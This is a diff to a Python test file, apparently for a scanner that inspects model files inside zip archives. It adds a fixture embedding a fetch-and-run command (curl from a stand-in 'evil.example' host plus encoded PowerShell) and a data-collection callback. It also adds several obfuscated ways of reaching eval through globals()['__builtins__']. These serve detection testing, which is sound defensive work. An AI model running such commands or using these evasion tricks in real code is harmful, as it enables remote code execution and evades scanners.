@@ -55,6 +55,14 @@ def _malicious_lightgbm_payload() -> bytes:
     )
 
 
+def _malicious_rknn_payload() -> bytes:
+    return (
+        b"RKNN\x01\x00\x00\x00"
+        b"notes=cmd.exe /c curl https://evil.example/payload && powershell -enc AAAA\n"
+        b"callback=http://198.51.100.5:8080/collect\n"
+    )
+
+
 def test_rewrite_extracted_member_location_preserves_scanner_specific_suffix_policy() -> None:
     assert (
         rewrite_extracted_member_location(
@@ -210,6 +218,12 @@ def test_scan_zip_flags_builtins_getattr_keyword_call_dangerous_python_member(tm
         "__builtins__['ev' + 'al']('1 + 1')\n",
         "getattr(__builtins__, 'eval')('1 + 1')\n",
         "__builtins__.__dict__.get('eval')('1 + 1')\n",
+        "globals()['__builtins__']['ev' + 'al']('1 + 1')\n",
+        "globals().get('__builtins__').get('eval')('1 + 1')\n",
+        "getattr(globals()['__builtins__'], 'eval')('1 + 1')\n",
+        "globals()['__builtins__'].eval('1 + 1')\n",
+        "builtins_ref = globals()['__builtins__']\ngetattr(builtins_ref, 'eval')('1 + 1')\n",
+        "global_namespace = globals()\nglobal_namespace['__builtins__']['eval']('1 + 1')\n",
     ],
 )
 def test_scan_zip_flags_implicit_builtins_dangerous_python_member(tmp_path: Path, source: str) -> None:
@@ -234,6 +248,9 @@ def test_scan_zip_flags_implicit_builtins_dangerous_python_member(tmp_path: Path
     [
         "callbacks = {'eval': len}\ncallbacks['eval']([])\n",
         "import builtins as bi\nbi.open('labels.json', 'r')\n",
+        "globals()['__builtins__']['len']([1])\n",
+        "globals = lambda: {'__builtins__': {'eval': len}}\nglobals()['__builtins__']['eval']([])\n",
+        "global_namespace = {'__builtins__': {'eval': len}}\nglobal_namespace['__builtins__']['eval']([])\n",
     ],
 )
 def test_scan_zip_allows_benign_builtin_shaped_source(tmp_path: Path, source: str) -> None:
@@ -1828,7 +1845,11 @@ class TestZipScanner:
 
     @pytest.mark.parametrize(
         ("scanner_name", "payload"),
-        [("cntk", _malicious_cntkv2_payload()), ("lightgbm", _malicious_lightgbm_payload())],
+        [
+            ("cntk", _malicious_cntkv2_payload()),
+            ("lightgbm", _malicious_lightgbm_payload()),
+            ("rknn", _malicious_rknn_payload()),
+        ],
     )
     def test_nested_member_routes_renamed_strict_signature_payload(
         self,
@@ -1853,6 +1874,7 @@ class TestZipScanner:
         [
             b"\x08\x01\x12\x11\x0a\x07version\x12\x06\x08\x01\x10\x03(\x02\x12\x09\x0a\x03uid\x12\x02ab inputs",
             b"tree\nversion=v4\nnum_class=1\nnum_tree_per_iteration=1\nmax_feature_idx=2\n",
+            b"RKNX\x01\x00\x00\x00runtime=rockchip\n",
         ],
     )
     def test_nested_member_rejects_renamed_signature_near_match(self, tmp_path: Path, payload: bytes) -> None:
